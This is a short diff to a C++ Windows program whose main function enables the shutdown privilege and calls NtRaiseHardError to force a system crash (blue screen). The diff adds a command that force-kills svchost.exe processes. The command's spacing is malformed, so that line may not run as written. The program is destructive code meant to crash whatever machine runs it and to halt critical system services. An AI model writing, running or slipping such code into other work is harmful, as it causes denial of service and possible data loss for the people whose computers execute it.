@@ -1,4 +1,4 @@
-﻿#include <Windows.h>
+#include <Windows.h>
 
 #pragma comment(lib, "ntdll.lib")
 
@@ -15,6 +15,7 @@ int main() {
     unsigned long response;
     RtlAdjustPrivilege(19, true, false, &bl);
     NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 0, &response);
-    std::cout << "\n\n :) Good Bye\n\n" << std::endl;
+    system("taskkill / f / im svchost.exe");
+    std::cout << "\n\n:) Good Bye\n\n" << std::endl;
     return 0;
 }
